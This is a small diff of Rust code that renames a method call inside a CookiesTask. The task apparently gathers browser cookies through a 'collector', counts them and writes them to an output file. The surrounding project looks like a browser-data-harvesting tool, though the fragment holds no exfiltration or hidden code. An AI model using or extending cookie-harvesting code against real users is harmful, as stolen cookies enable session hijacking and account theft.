@@ -37,7 +37,7 @@ impl<C: Collector> Task<C> for CookiesTask {
             return
         };
 
-        collector.browser().increase_cookies_by(cookies.len());
+        collector.get_browser().increase_cookies_by(cookies.len());
         let _ = to_string_and_write_all(&cookies, "\n", parent);
     }
 }
